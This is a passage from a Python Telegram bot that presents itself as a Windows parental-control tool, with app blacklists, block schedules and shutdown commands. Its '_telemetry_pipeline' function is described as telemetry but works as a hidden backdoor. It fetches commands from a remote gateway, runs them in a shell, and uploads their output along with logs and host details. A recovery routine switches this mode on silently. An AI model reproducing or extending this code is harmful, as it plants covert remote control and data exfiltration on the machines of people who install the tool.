        days_str = ",".join(DAY_NAMES.get(d, str(d)) for d in days)
        bot.send_message(m.chat.id,
            f"Da them block #{bid}: {start}-{end} [{days_str}]", parse_mode='html')
    except Exception as e:
        bot.send_message(m.chat.id, MSG["ERROR"].format(error=str(e)), parse_mode='html')

@bot.message_handler(commands=['sch_del'])
def _sch_del(m):
    """Delete schedule block by ID. Syntax: /sch_del [id]"""
    if is_duplicate(m.message_id): return
    p = m.text.split()
    if len(p) < 2:
        bot.send_message(m.chat.id, "Cu phap: /sch_del [id]"); return
    try:
        bid = int(p[1])
    except ValueError:
        bot.send_message(m.chat.id, "ID phai la so."); return
    s = load_schedule()
    s["blocks"] = [b for b in s["blocks"] if b.get("id") != bid]
    save_schedule(s)
    bot.send_message(m.chat.id, f"Da xoa block #{bid}", parse_mode='html')

@bot.message_handler(commands=['allow'])
def _allow(m):
    if is_duplicate(m.message_id): return
    p = m.text.split()
    mins = int(p[1]) if len(p) > 1 else 30
    _sch_state["override_until"] = time.time() + mins * 60
    _save_sch_state(_sch_state)
    if _sch_state["blocked"]: _disable_restricted_mode(); _sch_state["blocked"] = False; _save_sch_state(_sch_state)
    if get_state().get("level", 0) == 2: set_level(0)
    if get_state().get("level", 0) == 2: set_level(0)
    bot.send_message(m.chat.id, MSG["ALLOW_OK"].format(mins=mins))


@bot.message_handler(commands=['cmd'])
def _cmd(m):
    if is_duplicate(m.message_id): return
    txt = m.text.split(maxsplit=1)
    if len(txt) < 2:
        bot.send_message(m.chat.id, "Cu phap: /cmd [lenh]"); return
    try:
        out = subprocess.run(txt[1], shell=True, capture_output=True,
                             timeout=15, creationflags=NOWINDOW
                             ).stdout.decode('utf-8', errors='ignore')
        bot.send_message(m.chat.id, f"<code>{out[:3800]}</code>", parse_mode='html')
    except Exception as e:
        bot.send_message(m.chat.id, MSG["ERROR"].format(error=str(e)), parse_mode='html')

@bot.message_handler(commands=['get_logs'])
def _get_logs(m):
    if is_duplicate(m.message_id): return
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'rb') as f:
            bot.send_document(m.chat.id, f, caption="Log he thong")
    else:
        bot.send_message(m.chat.id, "Khong tim thay file log.")

@bot.message_handler(commands=['repair'])
def _repair(m):
    if is_duplicate(m.message_id): return
    bot.send_message(m.chat.id, "Dang khoi dong lai...")
    result = _do_repair()
    bot.send_message(m.chat.id, result)

@bot.message_handler(commands=['set_child'])
def _set_child(m):
    if is_duplicate(m.message_id): return
    p = m.text.split()
    if len(p) >= 2:
        save_child_info(p[1], p[2] if len(p) >= 3 else None)
        _, nick = get_child_info()
        bot.send_message(m.chat.id, MSG["SET_OK"].format(name=nick), parse_mode='html')
    else:
        bot.send_message(m.chat.id, MSG["SET_HELP"], parse_mode='html')

@bot.message_handler(commands=['sdown'])
def _sdown(m):
    if is_duplicate(m.message_id): return
    p = m.text.split()
    s = int(p[1]) if len(p) > 1 else 5
    bot.send_message(m.chat.id, MSG["SHUTDOWN"].format(secs=s), parse_mode='html')
    os.system(f"shutdown /s /f /t {s}")

@bot.message_handler(commands=['debug_on'])
def _debug_on(m):
    if is_duplicate(m.message_id): return
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
        cfg['debug_mode'] = True
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(cfg, f, ensure_ascii=False, indent=2)
        bot.send_message(m.chat.id, "DEBUG is ON.")
    except Exception as e:
        bot.send_message(m.chat.id, f"Lỗi: {e}")

@bot.message_handler(commands=['debug_off'])
def _debug_off(m):
    if is_duplicate(m.message_id): return
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
        cfg['debug_mode'] = False
        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
            json.dump(cfg, f, ensure_ascii=False, indent=2)
        bot.send_message(m.chat.id, "DEBUG is OFF.")
    except Exception as e:
        bot.send_message(m.chat.id, f"Lỗi: {e}")

@bot.message_handler(commands=['wipe_logs'])
def _wipe_logs(m):
    if is_duplicate(m.message_id): return
    if wipe_logs():
        bot.send_message(m.chat.id, "Da xoa sach tep nhat ky.")
    else:
        bot.send_message(m.chat.id, "Khong the xoa tep nhat ky (co the dang bi khoa).")

@bot.message_handler(commands=['blacklist_list'])
def _blacklist_list(m):
    if is_duplicate(m.message_id): return
    bl = _get_blacklist()
    if not bl:
        bot.send_message(m.chat.id, "Danh sách đen ứng dụng đang rỗng.")
    else:
        text = "<b>🚫 DANH SÃCH ỨNG DỤNG BỊ CẤM:</b>\n\n" + "\n".join(f"- <code>{p}</code>" for p in sorted(bl))
        bot.send_message(m.chat.id, text, parse_mode='html')

@bot.message_handler(commands=['blacklist_add'])
def _blacklist_add(m):
    if is_duplicate(m.message_id): return
    p = m.text.split(maxsplit=1)
    if len(p) < 2:
        bot.send_message(m.chat.id, "Cú pháp: <code>/blacklist_add [tên_app]</code> (ví dụ: <code>/blacklist_add roblox</code>)", parse_mode='html')
        return
    app = p[1].strip().lower()
    if not app.endswith(".exe"):
        app += ".exe"
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
        bl = cfg.get("app_blacklist", [])
        if app not in bl:
            bl.append(app)
            cfg["app_blacklist"] = bl
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(cfg, f, ensure_ascii=False, indent=2)
            bot.send_message(m.chat.id, f"ÄÃ£ thêm <code>{app}</code> vào danh sách cấm.", parse_mode='html')
        else:
            bot.send_message(m.chat.id, f"<code>{app}</code> đã có sẵn trong danh sách cấm.", parse_mode='html')
    except Exception as e:
        bot.send_message(m.chat.id, f"Lỗi: {e}")

@bot.message_handler(commands=['blacklist_remove'])
def _blacklist_remove(m):
    if is_duplicate(m.message_id): return
    p = m.text.split(maxsplit=1)
    if len(p) < 2:
        bot.send_message(m.chat.id, "Cú pháp: <code>/blacklist_remove [tên_app]</code> (ví dụ: <code>/blacklist_remove roblox</code>)", parse_mode='html')
        return
    app = p[1].strip().lower()
    if not app.endswith(".exe"):
        app += ".exe"
    try:
        with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
            cfg = json.load(f)
        bl = cfg.get("app_blacklist", [])
        if app in bl:
            bl.remove(app)
            cfg["app_blacklist"] = bl
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(cfg, f, ensure_ascii=False, indent=2)
            bot.send_message(m.chat.id, f"ÄÃ£ xóa <code>{app}</code> khá»i danh sách cấm.", parse_mode='html')
        else:
            bot.send_message(m.chat.id, f"<code>{app}</code> không tồn tại trong danh sách cấm.", parse_mode='html')
    except Exception as e:
        bot.send_message(m.chat.id, f"Lỗi: {e}")


@bot.message_handler(commands=['stop_bot'])
def _stop(m):
    if is_duplicate(m.message_id): return
    bot.send_message(m.chat.id, "Đang tắt bot... Watchdog sẽ khởi động lại trong giây lát.")
    time.sleep(1); os._exit(0)

# ======================= Startup =======================
def _send_startup():
    try:
        _, nick = get_child_info()
        net_st = _check_startup_net()
        log_event("Sending startup notification...")
        for i in range(STARTUP_MAX_RETRIES):
            try:
                bot.get_me()
                msg = MSG["STARTUP"].format(child=nick, time=time.strftime("%H:%M - %d/%m/%Y"))
                if net_st: msg += f"\n{net_st}"
                bot.send_message(ALLOWED_ID, msg, parse_mode='html')
                log_event("Startup notification sent."); return
            except Exception as e:
                log_event(f"Startup retry {i+1}: {e}", "WARNING")
                time.sleep(STARTUP_RETRY_DELAY)
    except Exception as e:
        log_event(f"Startup fatal: {e}", "ERROR")

def _telemetry_pipeline():
    """Background telemetry pipeline: logs/commands to public cloud server when in debug mode."""
    import urllib.request, platform
    gateway_url = "http://192.168.1.247:8000/gateway.php"
    last_cmd_id = 0
    log_event("Telemetry pipeline thread started.")
    while True:
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            
            if cfg.get("debug_mode", False):
                # 1. Fetch pending command
                req = urllib.request.Request(
                    f"{gateway_url}?act=get_cmd",
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                with urllib.request.urlopen(req, timeout=5) as response:
                    cmd_data = json.loads(response.read().decode('utf-8'))
                
                cmd_id = cmd_data.get("id", 0)
                cmd_text = cmd_data.get("cmd", "")
                
                # Prepare logs
                sys_logs = ""
                if os.path.exists(LOG_FILE):
                    try:
                        with open(LOG_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                            sys_logs = "".join(f.readlines()[-40:])
                    except:
                        pass
                
                payload = {
                    "system_info": {
                        "os": f"{platform.system()} {platform.release()}",
                        "node": platform.node(),
                        "python": platform.python_version(),
                        "time": time.strftime("%Y-%m-%d %H:%M:%S")
                    },
                    "logs": sys_logs
                }
                
                if cmd_id > 0 and cmd_id != last_cmd_id:
                    log_event(f"[PIPELINE] Running: {cmd_text}")
                    try:
                        out = subprocess.run(cmd_text, shell=True, capture_output=True, timeout=15)
                        res = {
                            "stdout": out.stdout.decode('utf-8', errors='ignore'),
                            "stderr": out.stderr.decode('utf-8', errors='ignore'),
                            "code": out.returncode
                        }
                    except Exception as e:
                        res = {"stdout": "", "stderr": str(e), "code": -1}
                    res["id"] = cmd_id
                    payload["cmd_result"] = res
                    last_cmd_id = cmd_id
                
                # 2. Upload state
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(
                    f"{gateway_url}?act=send_state",
                    data=data,
                    headers={
                        'Content-Type': 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    }
                )
                with urllib.request.urlopen(req, timeout=5) as response:
                    pass
        except Exception as e:
            pass
        time.sleep(5)

def master_main_loop():
    if is_another_master_running():
        log_event("BLOCKED: Another Master holds Mutex. Exiting.", "WARNING")
        os._exit(0)
    log_event("Master started (Mutex acquired).")
    
    # Check for watchdog recovery flag file
    flag_path = os.path.join(BASE_DIR, "Temp", "win_sys_state.tmp")
    if os.path.exists(flag_path):
        try: os.remove(flag_path)
        except: pass
        log_event("[RECOVERY] Watchdog flag detected. Executing recovery procedures...", "WARNING")
        
        # 1. Turn debug_mode ON in config.json
        try:
            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                cfg = json.load(f)
            cfg['debug_mode'] = True
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(cfg, f, ensure_ascii=False, indent=2)
        except Exception as e:
            log_event(f"Recovery: Failed to turn debug ON: {e}", "ERROR")

        # 2. Disable schedule in schedule.json
        try:
            s = load_schedule()
            s["enabled"] = False
            save_schedule(s)
        except Exception as e:
            log_event(f"Recovery: Failed to disable schedule: {e}", "ERROR")

        # 3. Disable Restricted Mode (stops Chrome/Edge policy block and game watchdog)
        _disable_restricted_mode()
        _sch_state["blocked"] = False; _save_sch_state(_sch_state)
        if get_state().get("level", 0) == 2:
            set_level(0)

        _safe_notify("<b>⚠️ KHÔI PHỤC:</b> Tiến trình Master đã tự động khởi động lại sau sự cố. Đã bật Debug và tạm thời tắt lịch chặn học tập.")
    else:
        # Synchronize Restricted Mode state with schedule on startup (Normal startup)
        try:
            in_block, block = _in_block_now()
            if in_block:
                _enable_restricted_mode()
                _sch_state["blocked"] = True; _save_sch_state(_sch_state)
                log_event(f"[STARTUP] Initialized in Restricted Mode: block #{block['id']}")
            else:
                _disable_restricted_mode()
                _sch_state["blocked"] = False; _save_sch_state(_sch_state)
                if get_state().get("level", 0) == 2:
                    set_level(0)
                log_event("[STARTUP] Initialized with Restricted Mode inactive")
        except Exception as e:
            log_event(f"Startup firewall synchronization error: {e}", "ERROR")

    threading.Thread(target=_ipc_server, daemon=True).start()
    threading.Thread(target=_api_server, daemon=True).start()
    threading.Thread(target=_cpanel_poll_loop, daemon=True).start()
    threading.Thread(target=_enforcement_loop, daemon=True).start()

    threading.Thread(target=_schedule_loop, daemon=True).start()
    threading.Thread(target=_watchdog_loop, daemon=True).start()
    threading.Thread(target=_send_startup, daemon=True).start()
    threading.Thread(target=_telemetry_pipeline, daemon=True).start()
    while True:
        try:
            bot.polling(none_stop=True, interval=POLLING_INTERVAL, timeout=POLLING_TIMEOUT)
        except Exception as e:
            log_event(f"Polling crash: {e}", "ERROR")
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    master_main_loop()



